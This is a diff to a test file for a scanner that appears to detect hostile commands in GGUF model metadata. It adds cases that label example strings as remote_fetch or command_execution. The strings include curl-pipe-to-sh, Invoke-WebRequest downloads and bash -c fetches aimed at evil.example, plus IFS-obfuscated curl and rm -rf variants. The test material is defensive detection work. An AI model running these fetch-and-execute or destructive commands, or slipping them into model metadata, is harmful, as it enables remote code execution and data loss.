@@ -1454,6 +1454,7 @@ def test_gguf_metadata_key_slashes_without_traversal_are_not_flagged(tmp_path: P
         ("download", "curl --proto '=https' --tlsv1.2 -sSf https://evil.example/install.sh | sh", "remote_fetch"),
         ("download", "curl -X POST https://evil.example/payload.sh", "remote_fetch"),
         ("download", "curl --request POST https://evil.example/payload.sh", "remote_fetch"),
+        ("download", "Invoke-WebRequest -OutFile /tmp/p https://evil.example/p", "remote_fetch"),
         ("download", 'url=https://evil.example/payload.sh; curl "$url"', "remote_fetch"),
         ("download", "payload_url='https://evil.example/payload.sh'; wget ${payload_url}", "remote_fetch"),
         ("download", "curl${IFS}https://evil.example/payload.sh", "remote_fetch"),
@@ -1462,6 +1463,7 @@ def test_gguf_metadata_key_slashes_without_traversal_are_not_flagged(tmp_path: P
         ("download", "curl -H 'Authorization: Bearer token' https://evil.example/payload.sh", "remote_fetch"),
         ("loader", "/bin/bash -c 'curl https://evil.example/payload.sh'", "command_execution"),
         ("callback", "requests.get('https://evil.example/payload')", "remote_fetch"),
+        ("callback", "requests.delete('https://evil.example/payload')", "remote_fetch"),
         ("callback", 'requests.get(url="https://evil.example/payload")', "remote_fetch"),
         ("callback", 'url = "https://evil.example/payload"; requests.get(url)', "remote_fetch"),
         ("callback", "httpx.get('https://evil.example/payload')", "remote_fetch"),
@@ -1478,6 +1480,7 @@ def test_gguf_metadata_key_slashes_without_traversal_are_not_flagged(tmp_path: P
         ("callback", "window.fetch('https://evil.example/payload')", "remote_fetch"),
         ("general.description", "example: curl https://evil.example/payload.sh", "remote_fetch"),
         ("general.description", "Example:\n```bash\ncurl https://evil.example/payload.sh\n```", "remote_fetch"),
+        ("general.description", "timeout 5 bash -c 'curl https://evil.example/p'", "command_execution"),
         (
             "general.description",
             "Example:\n```bash\ncurl https://huggingface.co/org/model/resolve/main/install.sh | sh\n```",
@@ -1500,6 +1503,16 @@ def test_gguf_metadata_key_slashes_without_traversal_are_not_flagged(tmp_path: P
             "general.description",
             "# Model\n## Usage\n> docs\nrm${IFS}-rf${IFS}/tmp/model-cache",
             "command_execution",
+        ),
+        (
+            "general.description",
+            "# Model\n## Usage\n> documented setup\n> optional fetch\nurl='https://evil.example/p'\nrequests.delete(url)",
+            "remote_fetch",
+        ),
+        (
+            "general.description",
+            "# Model\n## Usage\n> documented setup\n> optional fetch\nurl=https://evil.example/p\ncurl $url",
+            "remote_fetch",
         ),
     ],
 )
@@ -1562,6 +1575,8 @@ def test_gguf_metadata_remote_fetch_near_matches_stay_clean(value: str) -> None:
         "curl -K https://evil.example/curlrc",
         "curl --config=https://evil.example/curlrc",
         "curl -ohttps://evil.example/output-name",
+        "curl --user-agent https://example.invalid/ua",
+        "curl -e https://example.invalid/ref",
     ],
 )
 def test_gguf_metadata_curl_option_values_without_destination_stay_clean(value: str) -> None:
